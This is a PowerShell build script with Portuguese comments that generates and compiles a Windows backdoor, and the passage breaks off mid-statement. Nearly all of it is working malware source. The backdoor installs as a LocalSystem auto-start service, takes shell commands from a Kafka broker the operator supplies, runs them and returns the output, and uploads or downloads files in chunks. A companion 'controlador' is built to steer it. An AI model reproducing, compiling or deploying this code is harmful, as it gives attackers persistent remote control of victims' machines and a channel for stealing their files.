########################################
# Desenvolvido por RAFAEL HARZER CORREIA
########################################

set home=%cd%

function compilarControlador(){
echo ""
$PSDefaultParameterValues['*:Encoding'] = 'utf8'
echo 'cmake_minimum_required(VERSION 3.8 FATAL_ERROR)
set(PROJECT_VERSION "1.0.0")
set (CMAKE_CXX_STANDARD 11)

execute_process(COMMAND git clone https://github.com/edenhill/librdkafka.git)
execute_process(COMMAND git checkout tags/v1.2.1 WORKING_DIRECTORY librdkafka)
    
add_subdirectory(${CMAKE_CURRENT_BINARY_DIR}/librdkafka ${CMAKE_CURRENT_BINARY_DIR}/librdkafka)
    
add_executable(controlador windows/controlador.cpp)
target_link_libraries(controlador PUBLIC rdkafka++)' > CMakeLists.txt
echo ""
echo "Criou CMakeLists.txt"

$discoLocal = Read-Host -Prompt 'Qual disco esta instalado o visual Studio (ex: D)'
cd bin
Remove-Item * -Force -Recurse
gci -recurse -filter "vcvars64.bat" -Path "${discoLocal}:\" | foreach-object {
$place_path = $_.directory}
CMD /C """$place_path\vcvars64.bat"" && cmake -G Ninja .. && ninja"
mv controlador.exe ../resultado/controlador.exe 
cd ..
echo "Seu controlador esta na pasta resultado"

Read-Host -Prompt 'Enter para voltar ao menu'

menu
}

function compilarBackdoor(){
echo ""
$nomeBackdoor = Read-Host -Prompt 'Nome da Backdoor'    
$PSDefaultParameterValues['*:Encoding'] = 'utf8'
echo 'cmake_minimum_required(VERSION 3.8 FATAL_ERROR)
set(PROJECT_VERSION "1.0.0")
set (CMAKE_CXX_STANDARD 11)

execute_process(COMMAND git clone https://github.com/edenhill/librdkafka.git)
execute_process(COMMAND git checkout tags/v1.2.1 WORKING_DIRECTORY librdkafka)
    
add_subdirectory(${CMAKE_CURRENT_BINARY_DIR}/librdkafka ${CMAKE_CURRENT_BINARY_DIR}/librdkafka)
    
add_executable(backdoor windows/backdoor.cpp)
target_link_libraries(backdoor PUBLIC rdkafka++)' > CMakeLists.txt
echo ""
echo "Criou CMakeLists.txt"

$discoLocal = Read-Host -Prompt 'Qual disco esta instalado o visual Studio (ex: D)'
cd bin
Remove-Item * -Force -Recurse
gci -recurse -filter "vcvars64.bat" -Path "${discoLocal}:\" | foreach-object {
$place_path = $_.directory}
CMD /C """$place_path\vcvars64.bat"" && cmake -G Ninja .. && ninja"
mv backdoor.exe ../resultado/$nomeBackdoor.exe 
cd ..
echo "Sua Backdoor esta na pasta resultado"

Read-Host -Prompt 'Enter para voltar ao menu'

menu
}

function confBackdoor(){
    cd windows/
    echo ""
    echo "Adicionar HOST e porta do KAFKA na Backdoor para linux. ex: 192.168.1.21:9092"
    $hostBackdoor = Read-Host -Prompt "informe o HOST do kafka"

    echo "Adicionar um identificador (ID) para a maquina. ex: maquina_1"
    echo "esse ID sera o topico kafka para se conectar."
    $IDBackdoor = Read-Host -Prompt "informe o identificador" 
	$PSDefaultParameterValues['*:Encoding'] = 'utf8'
	echo "#include ""rdkafka.h""
#include <Windows.h>
#include <tchar.h>

#include <direct.h>
#include  <io.h>
#include  <stdio.h>
#include  <stdlib.h>
#include <stdio.h>
#include <signal.h>
#include <string.h>
#include <ctype.h>
#include <array>

#define TOPICO_ID ""$IDBackdoor""
#define BROKER_IP ""$hostBackdoor""

#define LOG_FILE ""consumer.log""

SERVICE_STATUS g_ServiceStatus = { 0 };
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;

VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv);
VOID WINAPI ServiceCtrlHandler(DWORD);
DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);

#define SERVICE_NAME  _T(""Backdoor"")
#define SVCNAME TEXT(""Backdoor"")

SC_HANDLE schService;
SC_HANDLE schSCManager;

static void log_message(char* filename, char* message) {
	_chdir(""C:\\consumer_pasta"");
	FILE* logfile = fopen(filename, ""a"");
	fprintf(logfile, ""%s \n"", message);
	fclose(logfile);
}

static void dr_msg_cb(rd_kafka_t* rk, const rd_kafka_message_t* rkmessage, void* opaque) {
	if (rkmessage->err) {
		log_message(LOG_FILE, ""Deu falha ao enviar"");
	}
}

static void producer_resposta(char* result) {
	_chdir(""C:\\consumer_pasta"");

	log_message(LOG_FILE, ""iniciou comsumer"");

	char errstr[512];
	rd_kafka_t* rk2;
	rd_kafka_topic_t* rkt2;
	rd_kafka_conf_t* conf2;

	const char* brokers;
	const char* topic;
	const char* key_info;
	long length;

	log_message(LOG_FILE, ""fez declaraçoes de variaveis"");

	brokers = BROKER_IP;
	topic = ""resposta"";
	key_info = ""resposta"";

	size_t keysize = strlen(key_info);
	conf2 = rd_kafka_conf_new();
	size_t size = strlen(result);
	FILE* logfile = fopen(LOG_FILE, ""a"");

	log_message(LOG_FILE, ""Iniciou as confs"");

	if (rd_kafka_conf_set(conf2, ""bootstrap.servers"", brokers, errstr, sizeof(errstr)) != RD_KAFKA_CONF_OK) {
		fprintf(logfile, ""%s\n"", errstr);
	}

	rd_kafka_conf_set_dr_msg_cb(conf2, dr_msg_cb);

	rk2 = rd_kafka_new(RD_KAFKA_PRODUCER, conf2, errstr, sizeof(errstr));

	if (!rk2) {
		fprintf(logfile, ""%% Falha ao criar novo producer: %s\n"", errstr);
	}

	rkt2 = rd_kafka_topic_new(rk2, topic, NULL);
	if (!rkt2) {
		fprintf(logfile, ""%% Falha ao criar topic object: %s\n"",
			rd_kafka_err2str(rd_kafka_last_error()));
		rd_kafka_destroy(rk2);
	}

	log_message(LOG_FILE, ""terminou as confs"");

	if (rd_kafka_produce(
		/* Topic object */
		rkt2,
		/* use o particionador embutido para selecionar a partição*/
		RD_KAFKA_PARTITION_UA,
		0,
		/* Carga útil da mensagem (valor) e comprimento */
		result, size,
		/* Optional key and its length */
		key_info, keysize,
		/* Message opaque, provided in
		 * delivery report callback as
		 * msg_opaque. */
		NULL) == -1) {
		/**
		 * Failed to *enqueue* message for producing.
		 */
		fprintf(logfile, ""%% Falha ao * enfileirar * a mensagem para produzir %s: %s\n"", rd_kafka_topic_name(rkt2), rd_kafka_err2str(rd_kafka_last_error()));

		/* Poll to handle delivery reports */
		if (rd_kafka_last_error() ==
			RD_KAFKA_RESP_ERR__QUEUE_FULL) {
			rd_kafka_poll(rk2, 1000/*block for max 1000ms*/);
		}
	}
	log_message(LOG_FILE, ""Prdoduzio a mensagem.. esperando enviar"");
	rd_kafka_poll(rk2, -1/*non-blocking*/);
	log_message(LOG_FILE, ""Enviou mensagem resosta"");
	fclose(logfile);

	rd_kafka_flush(rk2, 100);

	/* Destroy topic object */
	rd_kafka_topic_destroy(rkt2);

	/* Destroy the producer instance */
	rd_kafka_destroy(rk2);
	log_message(LOG_FILE, ""Destruiu e fim"");
}

static void mandarmensagem(void* sendfarquivo, size_t size, const char* nome_arquivo, size_t keysize, rd_kafka_t* rk3, rd_kafka_topic_t* rkt3) {

	if (strstr(nome_arquivo, "".P.0"") != NULL) {
		log_message(LOG_FILE, ""Enviando arquivo primeira parte"");
	}
	else if (strstr(nome_arquivo, "".P."") != NULL) {
	}
	else {
		log_message(LOG_FILE, ""Ultima parte ... "");
	}

	if (rd_kafka_produce(rkt3, RD_KAFKA_PARTITION_UA, 0, sendfarquivo, size, nome_arquivo, keysize, NULL) == -1) {
		log_message(LOG_FILE, ""Falha ao * enfileirar * a mensagem para produzir"");

		if (rd_kafka_last_error() == RD_KAFKA_RESP_ERR__QUEUE_FULL) {
			rd_kafka_poll(rk3, 1000/*block for max 1000ms*/);
		}
	}

	rd_kafka_poll(rk3, -1);
}

static void grava_arquivo(char* nomearquivo, const void* ptr, size_t len) {
	_chdir(""C:\\consumer_pasta"");

	if (strstr(nomearquivo, "".P."") != NULL) {

		char* nome = (char*)malloc(strlen(nomearquivo));
		strncpy(nome, nomearquivo, strlen(nomearquivo));
		char* ponteiro_extencao = strstr(nome, "".P."");
		*ponteiro_extencao = '\0';
		const char* p = (const char*)ptr;

		if (strstr(nomearquivo, "".P.0"") != NULL) {
			if ((_access(nome, 0)) != -1) {
				remove(nome);
			}
			producer_resposta(""Arquivo recebido! montando o arquivo..."");
			log_message(LOG_FILE, ""Arquivo segmentado. Montando o arquivo.... "");
		}

		FILE* arquivo = fopen(nome, ""ab"");
		int totalgravado = fwrite(p, sizeof(char), len, arquivo);
		fclose(arquivo);

		if (strstr(nomearquivo, "".P.f"") != NULL) {
			FILE* logfile = fopen(LOG_FILE, ""a"");
			fprintf(logfile, ""arquivo montado com sucesso! %s \n"", nome);
			fclose(logfile);
			producer_resposta(""Arquivo montado com sucesso! ..."");
		}
		free(nome);
	}
	else {

		const char* p = (const char*)ptr;
		FILE* arquivo = fopen(nomearquivo, ""wb"");

		log_message(LOG_FILE, ""Arquivo gravado!"");
		int totalgravado = fwrite(p, sizeof(char), len, arquivo);
		fclose(arquivo);
	}


}

static void terminal(void* comand, size_t tamanho) {
	char* comando;
	comando = (char*)comand;
	comando[tamanho] = '\0';
	FILE* pipe;
	char buf[100];
	char* str = NULL;
	char* temp = NULL;
	unsigned int size = 1;  // start with size of 1 to make room for null terminator
	unsigned int strlength;

	log_message(LOG_FILE, ""Executando comando"");
	log_message(LOG_FILE, comando);

	/*
	* Use message payload to invoke a program and read the output
	*/
	pipe = _popen(comando, ""r"");
	if (!pipe) {
		log_message(LOG_FILE, ""Couldn't start command."");
		return;
	}

	while (fgets(buf, sizeof(buf), pipe) != NULL) {
		strlength = strlen(buf);
		temp = (char*)realloc(str, size + strlength);  // allocate room for the buf that gets appended
		if (temp == NULL) {
			// allocation error
		}
		else {
			str = temp;
		}
		strcpy(str + size - 1, buf);     // append buffer to str
		size += strlength;
	}

	if (str == NULL) {
		str = ""Comando execuado!"";
	}

	log_message(LOG_FILE, ""Enviando Resposta"");
	log_message(LOG_FILE, str);

	producer_resposta(str);
	_pclose(pipe);
}

long int findSize(const char* file_name) {
	struct stat st; /*declare stat variable*/

	/*get the size using stat()*/

	if (stat(file_name, &st) == 0)
		return (st.st_size);
	else
		return -1;
}

static void download_fun(void* arquivo, size_t tamanho) {
	char* nome_arquivo = (char*)arquivo;
	nome_arquivo[tamanho] = '\0';
	char errstr[512];
	rd_kafka_t* rk3;
	rd_kafka_topic_t* rkt3;
	rd_kafka_conf_t* conf3;
	const char* brokers;
	const char* topic;

	brokers = BROKER_IP;
	topic = ""resposta"";

	size_t numero_d_partes;
	size_t tamanho_ultima_parte = 0;
	char* sendfarquivo = 0;
	long length;
	int tamanho_da_mensagem = 500000;
	size_t size;

	FILE* logfile = fopen(LOG_FILE, ""a"");

	log_message(LOG_FILE, ""Iniciou as confs"");

	conf3 = rd_kafka_conf_new();

	if (rd_kafka_conf_set(conf3, ""bootstrap.servers"", brokers, errstr, sizeof(errstr)) != RD_KAFKA_CONF_OK) {
		fprintf(logfile, ""%s\n"", errstr);
	}

	rd_kafka_conf_set_dr_msg_cb(conf3, dr_msg_cb);

	rk3 = rd_kafka_new(RD_KAFKA_PRODUCER, conf3, errstr, sizeof(errstr));

	if (!rk3) {
		fprintf(logfile, ""%% Falha ao criar novo producer: %s\n"", errstr);
	}

	rkt3 = rd_kafka_topic_new(rk3, topic, NULL);
	if (!rkt3) {
		fprintf(logfile, ""%% Falha ao criar topic object: %s\n"",
			rd_kafka_err2str(rd_kafka_last_error()));
		rd_kafka_destroy(rk3);
	}

	log_message(LOG_FILE, ""terminou as confs"");
	fclose(logfile);

	FILE* farquivo = fopen(nome_arquivo, ""rb"");

	if (farquivo == NULL) {
		producer_resposta(""Nao foi possivel abrir o arquivo informado!"");
		return;
	}
	size = findSize(nome_arquivo);

	strrev(nome_arquivo);
	if (strstr(nome_arquivo, ""/"") != NULL) {
		char* barra = strstr(nome_arquivo, ""/"");
		*barra = '\0';
		nome_arquivo[strlen(nome_arquivo)] = '\0';
	}
	strrev(nome_arquivo);

	strrev(nome_arquivo);
	if (strstr(nome_arquivo, ""\\"") != NULL) {
		char* barra = strstr(nome_arquivo, ""\\"");
		*barra = '\0';
		nome_arquivo[strlen(nome_arquivo)] = '\0';
	}
	strrev(nome_arquivo);

	size_t keysize = strlen(nome_arquivo);

	if (size > tamanho_da_mensagem) {
		if (size % tamanho_da_mensagem == 0) {
			numero_d_partes = size / tamanho_da_mensagem; /*quantas partes o arquivo vai ter*/
			tamanho_ultima_parte = tamanho_da_mensagem;
		}
		else {
			numero_d_partes = (size / tamanho_da_mensagem) + 1; /*quantas partes o arquivo vai ter*/
			tamanho_ultima_parte = size % tamanho_da_mensagem;
		}

		char** nomearquivoVetor = new char* [numero_d_partes];
		char* arquivos_mandar = (char*)malloc(tamanho_da_mensagem);
		int ponteiro_d_bite = 500000;
		int i;

		for (i = 0; i < numero_d_partes; i++) {

			if (i == numero_d_partes - 1) {
				arquivos_mandar = (char*)realloc(arquivos_mandar, tamanho_ultima_parte);
				fread(arquivos_mandar, 1, tamanho_ultima_parte, farquivo); /*leu o tamanho da ultima parte do arquivo e gravou na variavel*/
				/*Acrescenta a na chave um identificador da parte.*/
				char* dest = new char[strlen(nome_arquivo)];
				strcpy(dest, nome_arquivo);
				nomearquivoVetor[i] = strcat(dest, "".P.f"");
				mandarmensagem(arquivos_mandar, tamanho_ultima_parte, nomearquivoVetor[i], strlen(nomearquivoVetor[i]), rk3, rkt3);
			}
			else {
				fread(arquivos_mandar, 1, tamanho_da_mensagem, farquivo);/* colocou 100 mb do arquivo na variavel arquivo_mandar*/
				fseek(farquivo, ponteiro_d_bite, SEEK_SET);/*foi pra posição de 100mb*/
				ponteiro_d_bite = ponteiro_d_bite + tamanho_da_mensagem;/* adicionou 100mb no ponteiro de bite vale 200mb*/
				/*Acrescenta a na chave um identificador da parte.*/
				char* dest = new char[strlen(nome_arquivo)];
				char* acrecentar = new char[i + 1 + sizeof(i)];
				strcpy(dest, nome_arquivo);
				sprintf(acrecentar, "".P.%d"", i);
				nomearquivoVetor[i] = strcat(dest, acrecentar);
				mandarmensagem(arquivos_mandar, tamanho_da_mensagem, nomearquivoVetor[i], strlen(nomearquivoVetor[i]), rk3, rkt3);
			}

		}
		free(arquivos_mandar);
		fclose(farquivo);

	}
	else {
		if (farquivo) {
			fseek(farquivo, 0, SEEK_END);
			length = ftell(farquivo);
			fseek(farquivo, 0, SEEK_SET);
			sendfarquivo = (char*)malloc(length);
			if (sendfarquivo) {
				fread(sendfarquivo, 1, length, farquivo);
			}
			fclose(farquivo);
		}
		mandarmensagem(sendfarquivo, size, nome_arquivo, keysize, rk3, rkt3);
		free(sendfarquivo);
	}
}
VOID __stdcall DoStartSvc()
{
	SERVICE_STATUS_PROCESS ssStatus;
	DWORD dwOldCheckPoint;
	DWORD dwStartTickCount;
	DWORD dwWaitTime;
	DWORD dwBytesNeeded;

	// Get a handle to the SCM database. 

	schSCManager = OpenSCManager(
		NULL,                    // local computer
		NULL,                    // servicesActive database 
		SC_MANAGER_ALL_ACCESS);  // full access rights 

	if (NULL == schSCManager)
	{
		printf(""OpenSCManager failed (%d)\n"", GetLastError());
		return;
	}

	// Get a handle to the service.

	schService = OpenService(
		schSCManager,         // SCM database 
		SVCNAME,            // name of service 
		SERVICE_ALL_ACCESS);  // full access 

	if (schService == NULL)
	{
		printf(""OpenService failed (%d)\n"", GetLastError());
		CloseServiceHandle(schSCManager);
		return;
	}

	// Check the status in case the service is not stopped. 

	if (!QueryServiceStatusEx(
		schService,                     // handle to service 
		SC_STATUS_PROCESS_INFO,         // information level
		(LPBYTE)&ssStatus,             // address of structure
		sizeof(SERVICE_STATUS_PROCESS), // size of structure
		&dwBytesNeeded))              // size needed if buffer is too small
	{
		printf(""QueryServiceStatusEx failed (%d)\n"", GetLastError());
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return;
	}

	// Check if the service is already running. It would be possible 
	// to stop the service here, but for simplicity this example just returns. 

	if (ssStatus.dwCurrentState != SERVICE_STOPPED && ssStatus.dwCurrentState != SERVICE_STOP_PENDING)
	{
		printf(""Cannot start the service because it is already running\n"");
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return;
	}

	// Save the tick count and initial checkpoint.

	dwStartTickCount = GetTickCount();
	dwOldCheckPoint = ssStatus.dwCheckPoint;

	// Wait for the service to stop before attempting to start it.

	while (ssStatus.dwCurrentState == SERVICE_STOP_PENDING)
	{
		// Do not wait longer than the wait hint. A good interval is 
		// one-tenth of the wait hint but not less than 1 second  
		// and not more than 10 seconds. 

		dwWaitTime = ssStatus.dwWaitHint / 10;

		if (dwWaitTime < 1000)
			dwWaitTime = 1000;
		else if (dwWaitTime > 10000)
			dwWaitTime = 10000;

		Sleep(dwWaitTime);

		// Check the status until the service is no longer stop pending. 

		if (!QueryServiceStatusEx(
			schService,                     // handle to service 
			SC_STATUS_PROCESS_INFO,         // information level
			(LPBYTE)&ssStatus,             // address of structure
			sizeof(SERVICE_STATUS_PROCESS), // size of structure
			&dwBytesNeeded))              // size needed if buffer is too small
		{
			printf(""QueryServiceStatusEx failed (%d)\n"", GetLastError());
			CloseServiceHandle(schService);
			CloseServiceHandle(schSCManager);
			return;
		}

		if (ssStatus.dwCheckPoint > dwOldCheckPoint)
		{
			// Continue to wait and check.

			dwStartTickCount = GetTickCount();
			dwOldCheckPoint = ssStatus.dwCheckPoint;
		}
		else
		{
			if (GetTickCount() - dwStartTickCount > ssStatus.dwWaitHint)
			{
				printf(""Timeout waiting for service to stop\n"");
				CloseServiceHandle(schService);
				CloseServiceHandle(schSCManager);
				return;
			}
		}
	}

	// Attempt to start the service.

	if (!StartService(
		schService,  // handle to service 
		0,           // number of arguments 
		NULL))      // no arguments 
	{
		printf(""StartService failed (%d)\n"", GetLastError());
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return;
	}
	else printf(""Service start pending...\n"");

	// Check the status until the service is no longer start pending. 

	if (!QueryServiceStatusEx(
		schService,                     // handle to service 
		SC_STATUS_PROCESS_INFO,         // info level
		(LPBYTE)&ssStatus,             // address of structure
		sizeof(SERVICE_STATUS_PROCESS), // size of structure
		&dwBytesNeeded))              // if buffer too small
	{
		printf(""QueryServiceStatusEx failed (%d)\n"", GetLastError());
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return;
	}

	// Save the tick count and initial checkpoint.

	dwStartTickCount = GetTickCount();
	dwOldCheckPoint = ssStatus.dwCheckPoint;

	while (ssStatus.dwCurrentState == SERVICE_START_PENDING)
	{
		// Do not wait longer than the wait hint. A good interval is 
		// one-tenth the wait hint, but no less than 1 second and no 
		// more than 10 seconds. 

		dwWaitTime = ssStatus.dwWaitHint / 10;

		if (dwWaitTime < 1000)
			dwWaitTime = 1000;
		else if (dwWaitTime > 10000)
			dwWaitTime = 10000;

		Sleep(dwWaitTime);

		// Check the status again. 

		if (!QueryServiceStatusEx(
			schService,             // handle to service 
			SC_STATUS_PROCESS_INFO, // info level
			(LPBYTE)&ssStatus,             // address of structure
			sizeof(SERVICE_STATUS_PROCESS), // size of structure
			&dwBytesNeeded))              // if buffer too small
		{
			printf(""QueryServiceStatusEx failed (%d)\n"", GetLastError());
			break;
		}

		if (ssStatus.dwCheckPoint > dwOldCheckPoint)
		{
			// Continue to wait and check.

			dwStartTickCount = GetTickCount();
			dwOldCheckPoint = ssStatus.dwCheckPoint;
		}
		else
		{
			if (GetTickCount() - dwStartTickCount > ssStatus.dwWaitHint)
			{
				// No progress made within the wait hint.
				break;
			}
		}
	}

	// Determine whether the service is running.

	if (ssStatus.dwCurrentState == SERVICE_RUNNING)
	{
		printf(""Service started successfully.\n"");
	}
	else
	{
		printf(""Service not started. \n"");
		printf(""  Current State: %d\n"", ssStatus.dwCurrentState);
		printf(""  Exit Code: %d\n"", ssStatus.dwWin32ExitCode);
		printf(""  Check Point: %d\n"", ssStatus.dwCheckPoint);
		printf(""  Wait Hint: %d\n"", ssStatus.dwWaitHint);
	}

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
}

VOID SvcInstall()
{
	SC_HANDLE schSCManager;
	SC_HANDLE schService;
	LPCSTR szPath = ""C:\\consumer_pasta\\backdoor.exe"";

	// Get a handle to the SCM database. 

	schSCManager = OpenSCManager(
		NULL,                    // local computer
		NULL,                    // ServicesActive database 
		SC_MANAGER_ALL_ACCESS);  // full access rights 

	if (NULL == schSCManager)
	{
		printf(""OpenSCManager failed (%d)\n"", GetLastError());
		return;
	}

	// Create the service

	schService = CreateService(
		schSCManager,              // SCM database 
		SVCNAME,                   // name of service 
		SVCNAME,                   // service name to display 
		SERVICE_ALL_ACCESS,        // desired access 
		SERVICE_WIN32_OWN_PROCESS, // service type 
		SERVICE_AUTO_START,      // start type 
		SERVICE_ERROR_NORMAL,      // error control type 
		szPath,                    // path to service's binary 
		NULL,                      // no load ordering group 
		NULL,                      // no tag identifier 
		NULL,                      // no dependencies 
		NULL,                      // LocalSystem account 
		NULL);                     // no password 

	if (schService == NULL)
	{
		printf(""CreateService failed (%d)\n"", GetLastError());
		CloseServiceHandle(schSCManager);
		return;
	}
	else printf(""Service installed successfully\n"");

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
}

int _tmain(int argc, TCHAR* argv[]) {
	if (lstrcmpi(argv[1], TEXT(""install"")) == 0)
	{
		SvcInstall();
		DoStartSvc();
		return 0;
	}

	OutputDebugString(_T(""Consumer Service: Main: Entry""));

	SERVICE_TABLE_ENTRY ServiceTable[] =
	{
		{SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
		{NULL, NULL}
	};

	if (StartServiceCtrlDispatcher(ServiceTable) == FALSE)
	{
		OutputDebugString(_T(""Consumer Service: Main: StartServiceCtrlDispatcher returned error""));
		return GetLastError();
	}

	OutputDebugString(_T(""Consumer Service: Main: Exit""));
	return 0;
}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
	DWORD Status = E_FAIL;

	OutputDebugString(_T(""Consumer Service: ServiceMain: Entry""));

	g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);

	if (g_StatusHandle == NULL)
	{
		OutputDebugString(_T(""Consumer Service: ServiceMain: RegisterServiceCtrlHandler returned error""));
		goto EXIT;
	}

	// Tell the service controller we are starting
	ZeroMemory(&g_ServiceStatus, sizeof(g_ServiceStatus));
	g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	g_ServiceStatus.dwControlsAccepted = 0;
	g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	g_ServiceStatus.dwWin32ExitCode = 0;
	g_ServiceStatus.dwServiceSpecificExitCode = 0;
	g_ServiceStatus.dwCheckPoint = 0;

	if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE) {
		OutputDebugString(_T(""Consumer Service: ServiceMain: SetServiceStatus returned error""));
	}

	/*
	 * Perform tasks neccesary to start the service here
	 */
	OutputDebugString(_T(""Consumer Service: ServiceMain: Performing Service Start Operations""));

	// Create stop event to wait on later.
	g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (g_ServiceStopEvent == NULL)
	{
		OutputDebugString(_T(""Consumer Service: ServiceMain: CreateEvent(g_ServiceStopEvent) returned error""));

		g_ServiceStatus.dwControlsAccepted = 0;
		g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		g_ServiceStatus.dwWin32ExitCode = GetLastError();
		g_ServiceStatus.dwCheckPoint = 1;

		if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
		{
			OutputDebugString(_T(""Consumer Service: ServiceMain: SetServiceStatus returned error""));
		}
		goto EXIT;
	}

	// Tell the service controller we are started
	g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	g_ServiceStatus.dwWin32ExitCode = 0;
	g_ServiceStatus.dwCheckPoint = 0;

	if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
	{
		OutputDebugString(_T(""Consumer Service: ServiceMain: SetServiceStatus returned error""));
	}

	// Start the thread that will perform the main task of the service
	HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);

	OutputDebugString(_T(""Consumer Service: ServiceMain: Waiting for Worker Thread to complete""));

	// Wait until our worker thread exits effectively signaling that the service needs to stop
	WaitForSingleObject(hThread, INFINITE);

	OutputDebugString(_T(""Consumer Service: ServiceMain: Worker Thread Stop Event signaled""));


	/*
	 * Perform any cleanup tasks
	 */
	OutputDebugString(_T(""Consumer Service: ServiceMain: Performing Cleanup Operations""));

	CloseHandle(g_ServiceStopEvent);

	g_ServiceStatus.dwControlsAccepted = 0;
	g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
	g_ServiceStatus.dwWin32ExitCode = 0;
	g_ServiceStatus.dwCheckPoint = 3;

	if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
	{
		OutputDebugString(_T(""Consumer Service: ServiceMain: SetServiceStatus returned error""));
	}

EXIT:
	OutputDebugString(_T(""Consumer Service: ServiceMain: Exit""));

	return;
}


VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
	OutputDebugString(_T(""Consumer Service: ServiceCtrlHandler: Entry""));

	switch (CtrlCode) {
	case SERVICE_CONTROL_STOP:

		OutputDebugString(_T(""Consumer Service: ServiceCtrlHandler: SERVICE_CONTROL_STOP Request""));

		if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
			break;

		/*
		 * Perform tasks neccesary to stop the service here
		 */

		g_ServiceStatus.dwControlsAccepted = 0;
		g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		g_ServiceStatus.dwWin32ExitCode = 0;
		g_ServiceStatus.dwCheckPoint = 4;

		if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE) {
			OutputDebugString(_T(""Consumer Service: ServiceCtrlHandler: SetServiceStatus returned error""));
		}

		// This will signal the worker thread to start shutting down
		SetEvent(g_ServiceStopEvent);

		break;

	default:
		break;
	}

	OutputDebugString(_T(""Consumer Service: ServiceCtrlHandler: Exit""));
}


DWORD WINAPI ServiceWorkerThread(LPVOID lpParam) {
	OutputDebugString(_T(""Consumer Service: ServiceWorkerThread: Entry""));

	LPTSTR path = ""C:\\consumer_pasta"";
	SHFILEINFO shFileInfo;
	if (SHGetFileInfo((LPCSTR)path, 0, &shFileInfo, sizeof(SHFILEINFO), SHGFI_TYPENAME) != 0) {
	}
	else {
		mkdir(path);
	}

	//  Periodically check if the service has been requested to stop
	while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0) {

		log_message(LOG_FILE, ""Consumer service started!"");
		rd_kafka_t* rk;          /* Consumer instance handle */
		rd_kafka_conf_t* conf;   /* Temporary configuration object */
		rd_kafka_resp_err_t err; /* librdkafka API error code */
		char errstr[512];        /* librdkafka API error reporting buffer */
		const char* brokers;     /* Argument: broker list */
		const char* groupid;     /* Argument: Consumer group id */
		char* topics;           /* Argument: list of topics to subscribe to */
		int topic_cnt;           /* Number of topics to subscribe to */
		rd_kafka_topic_partition_list_t* subscription; /* Subscribed topics */
		int i;

		brokers = BROKER_IP;
		groupid = ""maquina"";
		topics = TOPICO_ID;
		topic_cnt = 2;


		conf = rd_kafka_conf_new();

		if (rd_kafka_conf_set(conf, ""bootstrap.servers"", brokers, errstr, sizeof(errstr)) != RD_KAFKA_CONF_OK) {
			log_message(LOG_FILE, ""Erro configuração bootstrap.servers"");
			log_message(LOG_FILE, errstr);
			rd_kafka_conf_destroy(conf);
			continue;
		}

		if (rd_kafka_conf_set(conf, ""group.id"", groupid, errstr, sizeof(errstr)) != RD_KAFKA_CONF_OK) {
			log_message(LOG_FILE, ""Erro configuração group.id"");
			log_message(LOG_FILE, errstr);
			rd_kafka_conf_destroy(conf);
			continue;
		}

		if (rd_kafka_conf_set(conf, ""auto.offset.reset"", ""earliest"", errstr, sizeof(errstr)) != RD_KAFKA_CONF_OK) {
			log_message(LOG_FILE, errstr);
		}

		rd_kafka_conf_set(conf, ""receive.message.max.bytes"", ""1000000000"", errstr, sizeof(errstr));

		log_message(LOG_FILE, ""Conectou-se ao Broker"");

		rk = rd_kafka_new(RD_KAFKA_CONSUMER, conf, errstr, sizeof(errstr));
		if (!rk) {
			log_message(LOG_FILE, ""Failed to create new consumer:"");
			log_message(LOG_FILE, errstr);
			continue;
		}

		conf = NULL;

		rd_kafka_poll_set_consumer(rk);

		subscription = rd_kafka_topic_partition_list_new(topic_cnt);

		for (i = 0; i < topic_cnt; i++) {
			rd_kafka_topic_partition_list_add(subscription, topics, RD_KAFKA_PARTITION_UA);
		}

		err = rd_kafka_subscribe(rk, subscription);

		if (err) {
			log_message(LOG_FILE, ""Falha ao se inscrever no Topico!"");
			rd_kafka_topic_partition_list_destroy(subscription);
			rd_kafka_destroy(rk);
			continue;
		}

		rd_kafka_topic_partition_list_destroy(subscription);

		log_message(LOG_FILE, ""Start no loop, Esperando Arquivos.."");
		while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0) {

			rd_kafka_message_t* rkm;

			rkm = rd_kafka_consumer_poll(rk, 100);
			if (!rkm)
				continue;
			if (rkm->err) {
				rd_kafka_message_destroy(rkm);
				continue;
			}

			char* keynamefile;
			keynamefile = (char*)rkm->key;
			keynamefile[rkm->key_len] = '\0';

			/* Print the message key. */
			if (strstr(keynamefile, ""terminal"") != NULL) {
				log_message(LOG_FILE, ""Recebendo comandos "");
				terminal(rkm->payload, rkm->len);
			} if (strstr(keynamefile, ""--download-arquivo"") != NULL) {
				log_message(LOG_FILE, ""Download arquivo"");
				download_fun(rkm->payload, rkm->len);
			}
			else if (strstr(keynamefile, "".P.0"") != NULL) {
				log_message(LOG_FILE, ""Recebendo arquivo: "");
